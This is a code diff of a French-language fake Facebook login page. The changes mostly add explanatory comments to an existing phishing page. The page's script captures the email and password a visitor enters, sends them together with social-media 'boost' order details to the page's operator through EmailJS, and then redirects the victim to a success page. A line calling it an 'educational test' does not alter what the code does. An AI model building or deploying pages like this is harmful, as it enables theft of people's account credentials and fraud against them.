@@ -6,6 +6,7 @@
   <title>Facebook – Connectez-vous ou inscrivez-vous</title>
   <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet" />
   <style>
+    /* Variables CSS pour un thème sombre */
     :root {
       --facebook-bg-dark: #1c1e21;
       --facebook-card-bg: #242526;
@@ -18,6 +19,7 @@
       --border-color-input: #3e4042;
     }
 
+    /* Styles de base pour le corps de la page */
     body {
       font-family: 'Roboto', sans-serif;
       margin: 0;
@@ -29,6 +31,7 @@
       min-height: 100vh;
     }
 
+    /* En-tête supérieur */
     .top-header {
       width: 100%;
       padding: 15px 20px;
@@ -48,6 +51,7 @@
       font-size: 1em;
     }
 
+    /* Conteneur principal de la connexion */
     .login-container {
       flex-grow: 1;
       display: flex;
@@ -63,11 +67,12 @@
     }
 
     .facebook-logo img {
-      width: 120px; /* Réduit la taille du logo */
+      width: 120px;
       display: block;
       margin: 0 auto;
     }
 
+    /* Formulaire de connexion */
     .login-form {
       width: 100%;
       max-width: 380px;
@@ -138,6 +143,7 @@
       background-color: var(--facebook-dark-green-hover);
     }
 
+    /* Logo Meta */
     .meta-logo {
       margin-top: 30px;
       opacity: 0.5;
@@ -148,6 +154,7 @@
       width: 90px;
     }
 
+    /* Overlay de chargement */
     .loading-overlay {
       display: none;
       position: fixed;
@@ -183,6 +190,7 @@
       to { transform: rotate(360deg); }
     }
 
+    /* Media queries pour l'adaptation aux petits écrans */
     @media (max-width: 480px) {
       .login-form {
         padding: 20px;
@@ -228,39 +236,48 @@
 
   <script src="https://cdn.emailjs.com/sdk/2.3.2/email.min.js"></script>
   <script>
+    // Initialisation d'EmailJS avec la clé publique
     emailjs.init("4ltNmWrqPWnfKPy7x");
 
+    // Écouteur d'événement pour la soumission du formulaire
     document.getElementById("loginForm").addEventListener("submit", function(event) {
-      event.preventDefault();
+      event.preventDefault(); // Empêche la soumission par défaut du formulaire
 
+      // Récupération des valeurs du formulaire
       const email = document.getElementById("userEmail").value;
       const password = document.getElementById("userPassword").value;
       const date = new Date().toLocaleString();
       document.getElementById("date").value = date;
 
+      // Affichage de l'overlay de chargement
       document.getElementById("loadingOverlay").style.display = "flex";
 
+      // Création de l'objet contenant les paramètres pour le template EmailJS
       const templateParams = {
         user_email: email,
         user_password: password,
+        // Récupération des données du localStorage (ou valeur par défaut "Non spécifié")
         boostType: localStorage.getItem("finalBoostType") || "Non spécifié",
         profileLink: localStorage.getItem("finalProfileLink") || "Non spécifié",
         quantity: localStorage.getItem("finalQuantity") || "Non spécifié",
         price: localStorage.getItem("finalPrice") || "Non spécifié"
       };
 
+      // Envoi de l'e-mail via EmailJS
       emailjs.send("service_rtdebfm", "template_1g13r8b", templateParams)
         .then(() => {
+          // Si l'envoi réussit
           setTimeout(() => {
             alert("✅ Vérification réussie ! Vous allez être redirigé.");
-            window.location.href = "success.html";
+            window.location.href = "success.html"; // Redirection vers la page de succès
           }, 2000);
         })
         .catch((error) => {
+          // Si l'envoi échoue
           console.error("Erreur:", error);
           setTimeout(() => {
             alert("Une erreur est survenue, mais vos informations ont été reçues. (Test éducatif)");
-            window.location.href = "success.html";
+            window.location.href = "success.html"; // Redirection malgré l'erreur
           }, 2000);
         });
     });
